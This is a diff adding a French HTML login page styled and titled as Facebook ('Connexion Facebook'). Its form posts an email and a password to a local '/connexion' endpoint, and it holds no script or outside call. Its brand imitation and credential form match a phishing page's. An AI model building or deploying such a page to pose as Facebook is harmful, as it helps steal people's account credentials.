@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion Facebook</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+
+        /* En-tête Facebook */
+        .header {
+            background-color: #1877f2;
+            padding: 20px 40px;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 32px;
+            margin: 0;
+        }
+
+        /* Conteneur principal */
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 80px); /* hauteur totale - header */
+        }
+
+        /* Formulaire de connexion */
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        .login-container h2 {
+            text-align: center;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container a {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- En-tête -->
+<div class="header">
+    <h1>Facebook</h1>
+</div>
+
+<!-- Contenu principal -->
+<div class="main-container">
+    <div class="login-container">
+        <h2>Connexion</h2>
+        <form action="/connexion" method="post">
+            <input type="text" name="email" placeholder="Adresse e-mail ou numéro" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+            <a href="#">Mot de passe oublié ?</a>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
